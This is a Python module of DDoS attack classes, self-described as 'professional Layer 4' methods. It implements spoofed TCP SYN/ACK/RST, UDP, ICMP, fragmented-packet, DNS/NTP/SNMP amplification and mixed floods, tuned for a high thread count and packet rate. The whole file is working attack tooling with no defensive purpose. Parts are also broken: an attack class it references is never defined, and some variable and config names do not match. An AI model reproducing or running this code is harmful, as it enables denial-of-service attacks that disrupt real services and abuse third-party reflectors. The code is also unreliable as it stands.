"""
Layer 4 Attack Implementations
Professional Layer 4 DDoS attack methods
"""

import socket
import struct
import random
import time
import threading
import os
from typing import Dict, List, Optional, Tuple, Any, Union
from dataclasses import dataclass, field
from abc import ABC, abstractmethod
from concurrent.futures import ThreadPoolExecutor, as_completed
import ipaddress

from core.utils import NetworkUtils, CryptoUtils
from core.logger import logger
from layer4.packet_builder import PacketBuilder, TCPPacketBuilder, UDPPacketBuilder, ICMPPacketBuilder
from layer4.spoofing import SpoofingManager, SpoofingConfig
from layer4.amplification import AmplificationManager, AmplificationConfig


@dataclass
class Layer4Config:
    """Configuration for Layer 4 attacks"""
    # Target settings
    target_ip: str = ""
    target_ports: List[int] = field(default_factory=lambda: [80, 443, 22, 21, 25, 53, 8080, 8443, 3389, 23])
    port_range: Optional[Tuple[int, int]] = None
    
    # Attack settings - Ultra High Performance Mode
    attack_duration: int = 60  # seconds
    threads: int = 1000  # Increased from 500 to 1000
    packets_per_second: int = 50000  # Increased from 10000 to 50000
    packet_size: int = 16384  # Increased from 8192 to 16384 bytes
    
    # Protocol settings
    protocols: List[str] = field(default_factory=lambda: ['TCP', 'UDP'])
    tcp_flags: List[str] = field(default_factory=lambda: ['SYN', 'ACK', 'FIN', 'RST'])
    
    # Spoofing and evasion - Enhanced
    enable_spoofing: bool = True
    enable_fragmentation: bool = True  # Changed from False to True
    randomize_payloads: bool = True
    use_amplification: bool = True  # Changed from False to True
    
    # Advanced settings - Ultra Performance
    connection_timeout: int = 1  # Reduced from 2 to 1
    retry_attempts: int = 10  # Increased from 5 to 10
    burst_mode: bool = True
    burst_size: int = 1000  # Increased from 500 to 1000
    burst_interval: float = 0.001  # Reduced from 0.01 to 0.001
    
    # New Ultra Performance Settings
    enable_raw_sockets: bool = True
    enable_multi_threading: bool = True
    enable_async_mode: bool = True
    cpu_affinity: bool = True
    memory_optimization: bool = True
    network_buffer_size: int = 65536  # 64KB buffer
    socket_reuse: bool = True
    tcp_nodelay: bool = True
    socket_keepalive: bool = False


class Layer4Attack(ABC):
    """Abstract base class for Layer 4 attacks"""
    
    def __init__(self, config: Layer4Config):
        self.config = config
        self.attack_name = ""
        self.is_running = False
        self.stats = {
            'packets_sent': 0,
            'bytes_sent': 0,
            'connections_made': 0,
            'errors': 0,
            'start_time': 0,
            'end_time': 0
        }
        
        # Initialize components
        self.spoofing_manager = None
        if config.enable_spoofing:
            spoof_config = SpoofingConfig()
            self.spoofing_manager = SpoofingManager(spoof_config)
        
        self.amplification_manager = None
        if config.use_amplification:
            amp_config = AmplificationConfig()
            self.amplification_manager = AmplificationManager(amp_config)
    
    @abstractmethod
    def prepare_attack(self) -> bool:
        """Prepare attack (validate target, setup resources)"""
        pass
    
    @abstractmethod
    def execute_attack(self) -> Dict[str, Any]:
        """Execute the attack"""
        pass
    
    @abstractmethod
    def cleanup(self):
        """Cleanup resources after attack"""
        pass
    
    def start_attack(self) -> Dict[str, Any]:
        """Start the complete attack process"""
        logger.info(f"Starting {self.attack_name} attack against {self.config.target_ip}")
        
        # Prepare
        if not self.prepare_attack():
            return {'success': False, 'error': 'Attack preparation failed'}
        
        # Execute
        self.is_running = True
        self.stats['start_time'] = time.time()
        
        try:
            result = self.execute_attack()
            self.stats['end_time'] = time.time()
            
            # Add duration to result
            result['duration'] = self.stats['end_time'] - self.stats['start_time']
            result['stats'] = self.stats.copy()
            
            return result
            
        except Exception as e:
            logger.error(f"Attack execution failed: {e}")
            return {'success': False, 'error': str(e)}
        
        finally:
            self.is_running = False
            self.cleanup()
    
    def stop_attack(self):
        """Stop the attack"""
        self.is_running = False
        logger.info(f"Stopping {self.attack_name} attack")
    
    def _validate_target(self) -> bool:
        """Validate target IP and ports"""
        try:
            ipaddress.IPv4Address(self.config.target_ip)
            
            # Check if target is reachable
            if NetworkUtils.is_host_reachable(self.config.target_ip):
                return True
            else:
                logger.warning(f"Target {self.config.target_ip} may not be reachable")
                return True  # Continue anyway for testing
                
        except Exception as e:
            logger.error(f"Invalid target: {e}")
            return False
    
    def _get_spoofed_source(self) -> Dict[str, Any]:
        """Get spoofed source information"""
        if self.spoofing_manager:
            return self.spoofing_manager.get_spoofed_source()
        else:
            return {
                'ip': NetworkUtils.get_local_ip(),
                'port': random.randint(32768, 65535),
                'mac': '00:00:00:00:00:00',
                'ttl': 64
            }


class TCPFloodAttack(Layer4Attack):
    """TCP flood attack (SYN flood, ACK flood, etc.)"""
    
    def __init__(self, config: Layer4Config):
        super().__init__(config)
        self.attack_name = "TCP Flood"
        
        # Create packet config for the builder
        from layer4.packet_builder import PacketConfig
        packet_config = PacketConfig(
            destination_ip=config.target_ip,
            destination_port=config.target_ports[0] if config.target_ports else 80,
            protocol="tcp",
            spoof_source=config.enable_spoofing,
            randomize_fields=True
        )
        self.packet_builder = TCPPacketBuilder(packet_config)
        self.sockets = []
    
    def prepare_attack(self) -> bool:
        """Prepare TCP flood attack"""
        if not self._validate_target():
            return False
        
        # Prepare raw sockets
        try:
            for _ in range(min(self.config.threads, 50)):  # Limit raw sockets
                sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
                sock.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
                self.sockets.append(sock)
        except PermissionError:
            logger.warning("Raw sockets require administrator privileges, using regular sockets")
            # Fallback to regular TCP sockets
            return self._prepare_regular_tcp()
        except Exception as e:
            logger.error(f"Failed to create raw sockets: {e}")
            return False
        
        logger.info(f"Prepared {len(self.sockets)} raw sockets for TCP flood")
        return True
    
    def _prepare_regular_tcp(self) -> bool:
        """Prepare regular TCP sockets as fallback"""
        self.sockets = []  # Will create sockets on demand
        return True
    
    def execute_attack(self) -> Dict[str, Any]:
        """Execute TCP flood attack"""
        target_ports = self.config.target_ports
        if self.config.port_range:
            start_port, end_port = self.config.port_range
            target_ports = list(range(start_port, end_port + 1))
        
        # Calculate packets per thread
        packets_per_thread = self.config.packets_per_second // self.config.threads
        
        with ThreadPoolExecutor(max_workers=self.config.threads) as executor:
            futures = []
            
            for thread_id in range(self.config.threads):
                future = executor.submit(
                    self._tcp_flood_worker,
                    thread_id, target_ports, packets_per_thread
                )
                futures.append(future)
            
            # Wait for completion or timeout
            start_time = time.time()
            while (time.time() - start_time) < self.config.attack_duration and self.is_running:
                time.sleep(0.1)
            
            # Stop all threads
            self.is_running = False
            
            # Collect results with timeout
            completed_threads = 0
            for future in as_completed(futures, timeout=10):
                try:
                    future.result()
                    completed_threads += 1
                except Exception as e:
                    logger.warning(f"Thread completed with error: {e}")
            
            logger.info(f"✅ TCP flood attack completed - {completed_threads}/{self.config.threads} threads finished successfully")
        
        return {
            'success': True,
            'attack_type': 'TCP Flood',
            'packets_sent': self.stats['packets_sent'],
            'bytes_sent': self.stats['bytes_sent']
        }
    
    def _tcp_flood_worker(self, thread_id: int, target_ports: List[int], packets_per_thread: int):
        """Ultra-performance TCP flood worker thread"""
        sock = None
        packets_sent = 0
        bytes_sent = 0
        
        try:
            # Set CPU affinity for better performance (if enabled)
            if self.config.cpu_affinity and hasattr(os, 'sched_setaffinity'):
                try:
                    cpu_count = os.cpu_count()
                    cpu_id = thread_id % cpu_count
                    os.sched_setaffinity(0, {cpu_id})
                except:
                    pass  # Ignore if not supported
            
            if self.sockets:
                # Use raw socket with optimizations
                sock = self.sockets[thread_id % len(self.sockets)]
                
                # Apply socket optimizations
                if self.config.socket_reuse:
                    sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
                if self.config.tcp_nodelay:
                    sock.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
                if self.config.network_buffer_size > 0:
                    sock.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, self.config.network_buffer_size)
                
                packets_sent, bytes_sent = self._raw_tcp_flood(sock, target_ports, packets_per_second)
            else:
                # Use regular sockets with optimizations
                packets_sent, bytes_sent = self._regular_tcp_flood(target_ports, packets_per_second)
            
            # Update stats atomically
            with threading.Lock():
                self.stats['packets_sent'] += packets_sent
                self.stats['bytes_sent'] += bytes_sent
                
        except Exception as e:
            logger.debug(f"TCP flood worker {thread_id} error: {e}")
            with threading.Lock():
                self.stats['errors'] += 1
    
    def _raw_tcp_flood(self, sock: socket.socket, target_ports: List[int], packets_per_second: int):
        """Raw socket TCP flood"""
        packet_interval = 1.0 / packets_per_thread if packets_per_thread > 0 else 0
        last_packet_time = time.time()
        
        while self.is_running:
            current_time = time.time()
            
            if current_time - last_packet_time >= packet_interval:
                target_port = random.choice(target_ports)
                source_info = self._get_spoofed_source()
                
                # Create multiple TCP packets with different flags for maximum impact
                for flag in self.config.tcp_flags:
                    # Create larger payload for more bandwidth consumption
                    payload_size = random.randint(self.config.packet_size, self.config.packet_size * 2)
                    
                    packet = self.packet_builder.build_packet(
                        src_ip=source_info['ip'],
                        dst_ip=self.config.target_ip,
                        src_port=source_info['port'],
                        dst_port=target_port,
                        flags=flag,
                        payload_size=payload_size
                    )
                    
                    try:
                        # Send packet multiple times in burst mode
                        burst_count = self.config.burst_size if self.config.burst_mode else 1
                        for _ in range(burst_count):
                            sock.sendto(packet, (self.config.target_ip, target_port))
                            self.stats['packets_sent'] += 1
                            self.stats['bytes_sent'] += len(packet)
                            
                            if self.config.burst_mode:
                                time.sleep(self.config.burst_interval)
                                
                    except Exception as e:
                        self.stats['errors'] += 1
                        logger.debug(f"Failed to send packet: {e}")
                
                last_packet_time = current_time
            
            time.sleep(0.0001)  # Reduced delay for higher throughput
    
    def _regular_tcp_flood(self, target_ports: List[int], packets_per_second: int):
        """Regular socket TCP flood (SYN flood simulation)"""
        connection_interval = 1.0 / packets_per_thread if packets_per_thread > 0 else 0
        last_connection_time = time.time()
        
        while self.is_running:
            current_time = time.time()
            
            if current_time - last_connection_time >= connection_interval:
                target_port = random.choice(target_ports)
                
                try:
                    # Create connection attempt (SYN)
                    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    sock.settimeout(0.1)  # Very short timeout
                    
                    try:
                        sock.connect((self.config.target_ip, target_port))
                        self.stats['connections_made'] += 1
                    except:
                        pass  # Expected for flood attack
                    
                    sock.close()
                    self.stats['packets_sent'] += 1
                    
                except Exception as e:
                    self.stats['errors'] += 1
                
                last_connection_time = current_time
            
            time.sleep(0.001)
    
    def cleanup(self):
        """Cleanup TCP flood resources"""
        for sock in self.sockets:
            try:
                sock.close()
            except:
                pass
        self.sockets.clear()


class UDPFloodAttack(Layer4Attack):
    """UDP flood attack"""
    
    def __init__(self, config: Layer4Config):
        super().__init__(config)
        self.attack_name = "UDP Flood"
        
        # Create packet config for the builder
        from layer4.packet_builder import PacketConfig
        packet_config = PacketConfig(
            destination_ip=config.target_ip,
            destination_port=config.target_ports[0] if config.target_ports else 80,
            protocol="udp",
            spoof_source=config.enable_spoofing,
            randomize_fields=True
        )
        self.packet_builder = UDPPacketBuilder(packet_config)
        self.sockets = []
    
    def prepare_attack(self) -> bool:
        """Prepare UDP flood attack"""
        if not self._validate_target():
            return False
        
        # Create UDP sockets
        try:
            for _ in range(self.config.threads):
                sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                self.sockets.append(sock)
        except Exception as e:
            logger.error(f"Failed to create UDP sockets: {e}")
            return False
        
        logger.info(f"Prepared {len(self.sockets)} UDP sockets")
        return True
    
    def execute_attack(self) -> Dict[str, Any]:
        """Execute UDP flood attack"""
        target_ports = self.config.target_ports
        if self.config.port_range:
            start_port, end_port = self.config.port_range
            target_ports = list(range(start_port, end_port + 1))
        
        packets_per_thread = self.config.packets_per_second // self.config.threads
        
        with ThreadPoolExecutor(max_workers=self.config.threads) as executor:
            futures = []
            
            for thread_id in range(self.config.threads):
                future = executor.submit(
                    self._udp_flood_worker,
                    thread_id, target_ports, packets_per_thread
                )
                futures.append(future)
            
            # Wait for completion
            start_time = time.time()
            while (time.time() - start_time) < self.config.attack_duration and self.is_running:
                time.sleep(0.1)
            
            self.is_running = False
            
            # Collect results
            for future in as_completed(futures, timeout=5):
                try:
                    future.result()
                except Exception as e:
                    logger.debug(f"Thread error: {e}")
        
        return {
            'success': True,
            'attack_type': 'UDP Flood',
            'packets_sent': self.stats['packets_sent'],
            'bytes_sent': self.stats['bytes_sent']
        }
    
    def _udp_flood_worker(self, thread_id: int, target_ports: List[int], packets_per_thread: int):
        """Worker thread for UDP flood"""
        sock = self.sockets[thread_id % len(self.sockets)]
        packet_interval = 1.0 / packets_per_thread if packets_per_thread > 0 else 0
        last_packet_time = time.time()
        
        while self.is_running:
            current_time = time.time()
            
            if current_time - last_packet_time >= packet_interval:
                target_port = random.choice(target_ports)
                
                # Create payload
                if self.config.randomize_payloads:
                    payload = CryptoUtils.generate_random_bytes(self.config.packet_size)
                else:
                    payload = b'A' * self.config.packet_size
                
                try:
                    sock.sendto(payload, (self.config.target_ip, target_port))
                    self.stats['packets_sent'] += 1
                    self.stats['bytes_sent'] += len(payload)
                except Exception as e:
                    self.stats['errors'] += 1
                    logger.debug(f"Failed to send UDP packet: {e}")
                
                last_packet_time = current_time
            
            time.sleep(0.001)
    
    def cleanup(self):
        """Cleanup UDP flood resources"""
        for sock in self.sockets:
            try:
                sock.close()
            except:
                pass
        self.sockets.clear()


class ICMPFloodAttack(Layer4Attack):
    """ICMP flood attack"""
    
    def __init__(self, config: Layer4Config):
        super().__init__(config)
        self.attack_name = "ICMP Flood"
        
        # Create packet config for the builder
        from layer4.packet_builder import PacketConfig
        packet_config = PacketConfig(
            destination_ip=config.target_ip,
            protocol="icmp",
            spoof_source=config.enable_spoofing,
            randomize_fields=True
        )
        self.packet_builder = ICMPPacketBuilder(packet_config)
        self.sockets = []
    
    def prepare_attack(self) -> bool:
        """Prepare ICMP flood attack"""
        if not self._validate_target():
            return False
        
        try:
            # Create raw ICMP sockets
            for _ in range(min(self.config.threads, 10)):  # Limit ICMP sockets
                sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
                self.sockets.append(sock)
        except PermissionError:
            logger.error("ICMP flood requires administrator privileges")
            return False
        except Exception as e:
            logger.error(f"Failed to create ICMP sockets: {e}")
            return False
        
        logger.info(f"Prepared {len(self.sockets)} ICMP sockets")
        return True
    
    def execute_attack(self) -> Dict[str, Any]:
        """Execute ICMP flood attack"""
        packets_per_thread = self.config.packets_per_second // len(self.sockets)
        
        with ThreadPoolExecutor(max_workers=len(self.sockets)) as executor:
            futures = []
            
            for thread_id in range(len(self.sockets)):
                future = executor.submit(
                    self._icmp_flood_worker,
                    thread_id, packets_per_thread
                )
                futures.append(future)
            
            # Wait for completion
            start_time = time.time()
            while (time.time() - start_time) < self.config.attack_duration and self.is_running:
                time.sleep(0.1)
            
            self.is_running = False
            
            # Collect results
            for future in as_completed(futures, timeout=5):
                try:
                    future.result()
                except Exception as e:
                    logger.debug(f"Thread error: {e}")
        
        return {
            'success': True,
            'attack_type': 'ICMP Flood',
            'packets_sent': self.stats['packets_sent'],
            'bytes_sent': self.stats['bytes_sent']
        }
    
    def _icmp_flood_worker(self, thread_id: int, packets_per_thread: int):
        """Worker thread for ICMP flood"""
        sock = self.sockets[thread_id]
        packet_interval = 1.0 / packets_per_thread if packets_per_thread > 0 else 0
        last_packet_time = time.time()
        
        icmp_types = [8, 13, 15, 17]  # Echo, Timestamp, Info Request, Address Mask
        
        while self.is_running:
            current_time = time.time()
            
            if current_time - last_packet_time >= packet_interval:
                source_info = self._get_spoofed_source()
                icmp_type = random.choice(icmp_types)
                
                packet = self.packet_builder.build_packet(
                    src_ip=source_info['ip'],
                    dst_ip=self.config.target_ip,
                    icmp_type=icmp_type,
                    payload_size=self.config.packet_size
                )
                
                try:
                    sock.sendto(packet, (self.config.target_ip, 0))
                    self.stats['packets_sent'] += 1
                    self.stats['bytes_sent'] += len(packet)
                except Exception as e:
                    self.stats['errors'] += 1
                    logger.debug(f"Failed to send ICMP packet: {e}")
                
                last_packet_time = current_time
            
            time.sleep(0.001)
    
    def cleanup(self):
        """Cleanup ICMP flood resources"""
        for sock in self.sockets:
            try:
                sock.close()
            except:
                pass
        self.sockets.clear()


class AmplificationAttack(Layer4Attack):
    """Amplification attack using reflectors"""
    
    def __init__(self, config: Layer4Config):
        super().__init__(config)
        self.attack_name = "Amplification Attack"
        
        # Initialize amplification manager
        amp_config = AmplificationConfig()
        amp_config.max_threads = config.threads
        amp_config.packets_per_second = config.packets_per_second
        
        self.amplification_manager = AmplificationManager(amp_config)
    
    def prepare_attack(self) -> bool:
        """Prepare amplification attack"""
        if not self._validate_target():
            return False
        
        logger.info("Discovering amplification reflectors...")
        
        # Discover reflectors for all protocols
        reflector_counts = self.amplification_manager.discover_all_reflectors()
        
        total_reflectors = sum(reflector_counts.values())
        if total_reflectors == 0:
            logger.error("No amplification reflectors found")
            return False
        
        logger.info(f"Found {total_reflectors} total reflectors: {reflector_counts}")
        return True
    
    def execute_attack(self) -> Dict[str, Any]:
        """Execute amplification attack"""
        protocols = ['DNS', 'NTP', 'SNMP']  # Available protocols
        
        result = self.amplification_manager.launch_amplification_attack(
            target_ip=self.config.target_ip,
            duration=self.config.attack_duration,
            protocols=protocols
        )
        
        # Update stats
        self.stats['packets_sent'] = result.get('packets_sent', 0)
        self.stats['bytes_sent'] = result.get('bytes_amplified', 0)
        
        return {
            'success': True,
            'attack_type': 'Amplification',
            **result
        }
    
    def cleanup(self):
        """Cleanup amplification attack resources"""
        pass


class TCPACKFloodAttack(Layer4Attack):
    """TCP ACK flood attack - sends ACK packets without established connections"""
    
    def __init__(self, config: Layer4Config):
        super().__init__(config)
        self.attack_name = "TCP ACK Flood"
        
        from layer4.packet_builder import PacketConfig
        packet_config = PacketConfig(
            destination_ip=config.target_ip,
            destination_port=config.target_ports[0] if config.target_ports else 80,
            protocol="tcp",
            spoof_source=config.enable_spoofing,
            randomize_fields=True
        )
        self.packet_builder = TCPPacketBuilder(packet_config)
        self.sockets = []

    def prepare_attack(self) -> bool:
        """Prepare TCP ACK flood attack"""
        if not self._validate_target():
            return False
        
        try:
            for _ in range(min(self.config.threads, 50)):
                sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
                sock.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
                self.sockets.append(sock)
        except PermissionError:
            logger.error("TCP ACK flood requires administrator privileges")
            return False
        except Exception as e:
            logger.error(f"Failed to create raw sockets: {e}")
            return False
        
        logger.info(f"Prepared {len(self.sockets)} raw sockets for TCP ACK flood")
        return True

    def execute_attack(self) -> Dict[str, Any]:
        """Execute TCP ACK flood attack"""
        target_ports = self.config.target_ports
        if self.config.port_range:
            start_port, end_port = self.config.port_range
            target_ports = list(range(start_port, end_port + 1))
        
        packets_per_thread = self.config.packets_per_second // self.config.threads
        
        with ThreadPoolExecutor(max_workers=self.config.threads) as executor:
            futures = []
            
            for thread_id in range(self.config.threads):
                future = executor.submit(
                    self._tcp_ack_worker,
                    thread_id, target_ports, packets_per_thread
                )
                futures.append(future)
            
            start_time = time.time()
            while (time.time() - start_time) < self.config.attack_duration and self.is_running:
                time.sleep(0.1)
            
            self.is_running = False
            
            for future in as_completed(futures, timeout=5):
                try:
                    future.result()
                except Exception as e:
                    logger.debug(f"Thread error: {e}")
        
        return {
            'success': True,
            'attack_type': 'TCP ACK Flood',
            'packets_sent': self.stats['packets_sent'],
            'bytes_sent': self.stats['bytes_sent']
        }

    def _tcp_ack_worker(self, thread_id: int, target_ports: List[int], packets_per_thread: int):
        """Worker thread for TCP ACK flood"""
        sock = self.sockets[thread_id % len(self.sockets)]
        packet_interval = 1.0 / packets_per_thread if packets_per_thread > 0 else 0
        last_packet_time = time.time()
        
        while self.is_running:
            current_time = time.time()
            
            if current_time - last_packet_time >= packet_interval:
                target_port = random.choice(target_ports)
                source_info = self._get_spoofed_source()
                
                # Create ACK packet
                packet = self.packet_builder.build_packet(
                    src_ip=source_info['ip'],
                    src_port=source_info['port'],
                    dst_ip=self.config.target_ip,
                    dst_port=target_port,
                    tcp_flags=0x10,  # ACK flag
                    seq_num=random.randint(1, 4294967295),
                    ack_num=random.randint(1, 4294967295)
                )
                
                try:
                    sock.sendto(packet, (self.config.target_ip, 0))
                    self.stats['packets_sent'] += 1
                    self.stats['bytes_sent'] += len(packet)
                except Exception as e:
                    self.stats['errors'] += 1
                    logger.debug(f"Failed to send ACK packet: {e}")
                
                last_packet_time = current_time
            
            time.sleep(0.001)

    def cleanup(self):
        """Cleanup TCP ACK flood resources"""
        for sock in self.sockets:
            try:
                sock.close()
            except:
                pass
        self.sockets.clear()


class TCPRSTFloodAttack(Layer4Attack):
    """TCP RST flood attack - sends RST packets to disrupt connections"""
    
    def __init__(self, config: Layer4Config):
        super().__init__(config)
        self.attack_name = "TCP RST Flood"
        
        from layer4.packet_builder import PacketConfig
        packet_config = PacketConfig(
            destination_ip=config.target_ip,
            destination_port=config.target_ports[0] if config.target_ports else 80,
            protocol="tcp",
            spoof_source=config.enable_spoofing,
            randomize_fields=True
        )
        self.packet_builder = TCPPacketBuilder(packet_config)
        self.sockets = []

    def prepare_attack(self) -> bool:
        """Prepare TCP RST flood attack"""
        if not self._validate_target():
            return False
        
        try:
            for _ in range(min(self.config.threads, 50)):
                sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
                sock.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
                self.sockets.append(sock)
        except PermissionError:
            logger.error("TCP RST flood requires administrator privileges")
            return False
        except Exception as e:
            logger.error(f"Failed to create raw sockets: {e}")
            return False
        
        logger.info(f"Prepared {len(self.sockets)} raw sockets for TCP RST flood")
        return True

    def execute_attack(self) -> Dict[str, Any]:
        """Execute TCP RST flood attack"""
        target_ports = self.config.target_ports
        if self.config.port_range:
            start_port, end_port = self.config.port_range
            target_ports = list(range(start_port, end_port + 1))
        
        packets_per_thread = self.config.packets_per_second // self.config.threads
        
        with ThreadPoolExecutor(max_workers=self.config.threads) as executor:
            futures = []
            
            for thread_id in range(self.config.threads):
                future = executor.submit(
                    self._rst_flood_worker,
                    thread_id, packets_per_thread
                )
                futures.append(future)
            
            start_time = time.time()
            while (time.time() - start_time) < self.config.attack_duration and self.is_running:
                time.sleep(0.1)
            
            self.is_running = False
            
            for future in as_completed(futures, timeout=5):
                try:
                    future.result()
                except Exception as e:
                    logger.debug(f"Thread error: {e}")
        
        return {
            'success': True,
            'attack_type': 'TCP RST Flood',
            'packets_sent': self.stats['packets_sent'],
            'bytes_sent': self.stats['bytes_sent']
        }

    def _rst_flood_worker(self, thread_id: int, packets_per_thread: int):
        """Worker thread for TCP RST flood"""
        packet_interval = 1.0 / packets_per_thread if packets_per_thread > 0 else 0
        last_packet_time = time.time()
        
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
            sock.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
        except PermissionError:
            logger.error("TCP RST flood requires administrator privileges")
            return
        
        while self.is_running:
            current_time = time.time()
            
            if current_time - last_packet_time >= packet_interval:
                try:
                    # Create TCP RST packet
                    source_port = random.randint(1024, 65535)
                    packet = self._create_rst_packet(source_port)
                    
                    # Send packet
                    sock.sendto(packet, (self.config.target_host, 0))
                    
                    self.stats['packets_sent'] += 1
                    self.stats['bytes_sent'] += len(packet)
                
                except Exception as e:
                    self.stats['errors'] += 1
                    logger.debug(f"RST flood error: {e}")
                
                last_packet_time = current_time
            
            time.sleep(0.0001)
        
        sock.close()

    def _create_rst_packet(self, src_port: int) -> bytes:
        """Create TCP RST packet"""
        # Get local IP
        local_ip = socket.gethostbyname(socket.gethostname())
        
        # IP Header
        ip_header = struct.pack(
            '!BBHHHBBH4s4s',
            0x45, 0, 40,
            random.randint(1, 65535), 0, 64,
            socket.IPPROTO_TCP, 0,
            socket.inet_aton(local_ip),
            socket.inet_aton(self.config.target_host)
        )
        
        # TCP Header with RST flag
        tcp_header = struct.pack(
            '!HHLLBBHHH',
            src_port, self.config.target_port,
            random.randint(1, 4294967295), 0,
            0x50, 0x04,  # RST flag
            0, 0, 0
        )
        
        return ip_header + tcp_header


class FragmentedPacketFloodAttack(Layer4Attack):
    """Fragmented packet flood attack"""
    
    def __init__(self, config: Layer4Config):
        super().__init__(config)
        self.attack_name = "Fragmented Packet Flood"

    def prepare_attack(self) -> bool:
        """Prepare fragmented packet flood attack"""
        if not self._validate_target():
            return False
        
        logger.info("Preparing fragmented packet flood attack")
        return True

    def execute_attack(self) -> Dict[str, Any]:
        """Execute fragmented packet flood attack"""
        packets_per_thread = self.config.packets_per_second // self.config.threads
        
        with ThreadPoolExecutor(max_workers=self.config.threads) as executor:
            futures = []
            
            for thread_id in range(self.config.threads):
                future = executor.submit(
                    self._fragment_flood_worker,
                    thread_id, packets_per_thread
                )
                futures.append(future)
            
            start_time = time.time()
            while (time.time() - start_time) < self.config.attack_duration and self.is_running:
                time.sleep(0.1)
            
            self.is_running = False
            
            for future in as_completed(futures, timeout=5):
                try:
                    future.result()
                except Exception as e:
                    logger.debug(f"Thread error: {e}")
        
        return {
            'success': True,
            'attack_type': 'Fragmented Packet Flood',
            'packets_sent': self.stats['packets_sent'],
            'bytes_sent': self.stats['bytes_sent']
        }

    def _fragment_flood_worker(self, thread_id: int, packets_per_thread: int):
        """Worker thread for fragmented packet flood"""
        packet_interval = 1.0 / packets_per_thread if packets_per_thread > 0 else 0
        last_packet_time = time.time()
        
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_UDP)
            sock.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
        except PermissionError:
            logger.error("Fragmented packet flood requires administrator privileges")
            return
        
        while self.is_running:
            current_time = time.time()
            
            if current_time - last_packet_time >= packet_interval:
                try:
                    # Create fragmented packets
                    fragments = self._create_fragmented_packets()
                    
                    for fragment in fragments:
                        sock.sendto(fragment, (self.config.target_host, 0))
                        self.stats['packets_sent'] += 1
                        self.stats['bytes_sent'] += len(fragment)
                
                except Exception as e:
                    self.stats['errors'] += 1
                    logger.debug(f"Fragment flood error: {e}")
                
                last_packet_time = current_time
            
            time.sleep(0.0001)
        
        sock.close()

    def _create_fragmented_packets(self) -> List[bytes]:
        """Create fragmented UDP packets"""
        # Get local IP
        local_ip = socket.gethostbyname(socket.gethostname())
        
        # Create large UDP payload
        large_payload = os.urandom(2000)  # 2KB payload
        fragment_size = 1400  # MTU - IP header size
        
        fragments = []
        identification = random.randint(1, 65535)
        
        for i in range(0, len(large_payload), fragment_size):
            fragment_data = large_payload[i:i + fragment_size]
            
            # Calculate fragment offset
            fragment_offset = i // 8
            
            # Set More Fragments flag for all but last fragment
            flags = 0x2000 if i + fragment_size < len(large_payload) else 0
            flags_and_offset = flags | fragment_offset
            
            # IP Header
            ip_header = struct.pack(
                '!BBHHHBBH4s4s',
                0x45, 0,
                20 + len(fragment_data),  # Total length
                identification,
                flags_and_offset,
                64, socket.IPPROTO_UDP, 0,
                socket.inet_aton(local_ip),
                socket.inet_aton(self.config.target_host)
            )
            
            # For first fragment, add UDP header
            if i == 0:
                udp_header = struct.pack(
                    '!HHHH',
                    random.randint(1024, 65535),  # Source port
                    self.config.target_port,      # Destination port
                    8 + len(large_payload),       # UDP length
                    0                             # Checksum
                )
                fragment_data = udp_header + fragment_data[8:]
            
            fragments.append(ip_header + fragment_data)
        
        return fragments


class MixedLayer4Attack(Layer4Attack):
    """Mixed Layer 4 attack combining multiple techniques"""
    
    def __init__(self, config: Layer4Config):
        super().__init__(config)
        self.attack_name = "Mixed Layer 4 Attack"
        
        # Initialize sub-attacks
        self.syn_flood = TCPSYNFloodAttack(config)
        self.udp_flood = UDPFloodAttack(config)
        self.icmp_flood = ICMPFloodAttack(config)

    def prepare_attack(self) -> bool:
        """Prepare mixed Layer 4 attack"""
        if not self._validate_target():
            return False
        
        logger.info("Preparing mixed Layer 4 attack")
        return True

    def execute_attack(self) -> Dict[str, Any]:
        """Execute mixed Layer 4 attack"""
        # Distribute threads among attack types
        threads_per_attack = self.config.threads // 3
        
        with ThreadPoolExecutor(max_workers=3) as executor:
            futures = []
            
            # SYN flood
            syn_config = Layer4Config(**self.config.__dict__)
            syn_config.threads = threads_per_attack
            self.syn_flood.config = syn_config
            futures.append(executor.submit(self.syn_flood.execute_attack))
            
            # UDP flood
            udp_config = Layer4Config(**self.config.__dict__)
            udp_config.threads = threads_per_attack
            self.udp_flood.config = udp_config
            futures.append(executor.submit(self.udp_flood.execute_attack))
            
            # ICMP flood
            icmp_config = Layer4Config(**self.config.__dict__)
            icmp_config.threads = threads_per_attack
            self.icmp_flood.config = icmp_config
            futures.append(executor.submit(self.icmp_flood.execute_attack))
            
            # Wait for completion
            results = []
            for future in as_completed(futures):
                try:
                    result = future.result()
                    results.append(result)
                except Exception as e:
                    logger.debug(f"Sub-attack error: {e}")
        
        # Combine statistics
        total_packets = sum(r.get('packets_sent', 0) for r in results)
        total_bytes = sum(r.get('bytes_sent', 0) for r in results)
        
        return {
            'success': True,
            'attack_type': 'Mixed Layer 4 Attack',
            'packets_sent': total_packets,
            'bytes_sent': total_bytes,
            'sub_attack_results': results
        }

    def cleanup(self):
        """Cleanup mixed attack resources"""
        self.syn_flood.cleanup()
        self.udp_flood.cleanup()
        self.icmp_flood.cleanup()


# Update attack registry
LAYER4_ATTACKS = {
    'tcp_syn_flood': TCPSYNFloodAttack,
    'udp_flood': UDPFloodAttack,
    'icmp_flood': ICMPFloodAttack,
    'tcp_ack_flood': TCPACKFloodAttack,
    'tcp_rst_flood': TCPRSTFloodAttack,
    'fragmented_flood': FragmentedPacketFloodAttack,
    'mixed_layer4': MixedLayer4Attack,
}


